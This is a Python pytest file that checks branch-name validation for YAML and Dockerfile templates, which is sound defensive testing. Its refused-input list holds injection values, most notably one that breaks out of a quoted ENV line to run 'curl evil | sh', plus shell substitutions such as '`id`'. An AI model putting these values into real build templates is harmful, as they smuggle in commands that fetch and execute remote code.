# SPDX-FileCopyrightText: 2026 Jiri Vyskocil
# SPDX-License-Identifier: Apache-2.0

"""A branch name is written into a quoted YAML scalar and a Dockerfile ``ENV`` line.

Only names git itself accepts, without the three quoting metacharacters,
get that far: from the wizard answer and from a hand-edited project.yml.
"""

from __future__ import annotations

import pytest
from pydantic import ValidationError

from terok.lib.core.project_model import validate_branch_name
from terok.lib.core.yaml_schema import RawGitSection
from terok.lib.domain.wizards.new_project import validate_branch

_ACCEPTED = ["main", "feature/x-1.2", "release/2026.11", "user@host", "wip_v2", "caf\u00e9"]
_REFUSED = [
    'main"\nRUN curl evil | sh',
    "$HOME",
    "`id`",
    "a b",
    "a..b",
    "-x",
    "x.lock",
    "x/",
    "/x",
    "a//b",
    "a/.hidden",
    "@{upstream}",
    "@",
    "x.",
    "tab\there",
    "back\\slash",
]


@pytest.mark.parametrize("branch", _ACCEPTED)
def test_git_branch_names_are_accepted(branch: str) -> None:
    validate_branch_name(branch)
    assert validate_branch(branch) is None


@pytest.mark.parametrize("branch", _REFUSED)
def test_names_git_or_the_templates_refuse_are_rejected(branch: str) -> None:
    with pytest.raises(ValueError, match="Invalid branch name"):
        validate_branch_name(branch)
    assert validate_branch(branch) is not None


def test_empty_wizard_answer_means_the_remote_default() -> None:
    assert validate_branch("") is None


@pytest.mark.parametrize("branch", ["main", "", None])
def test_project_yaml_carries_a_valid_empty_or_absent_branch(branch: str | None) -> None:
    assert RawGitSection.model_validate({"default_branch": branch}).default_branch == branch


def test_project_yaml_refuses_a_branch_that_breaks_the_templates() -> None:
    with pytest.raises(ValidationError, match="Invalid branch name"):
        RawGitSection.model_validate({"default_branch": 'main"\nRUN evil'})
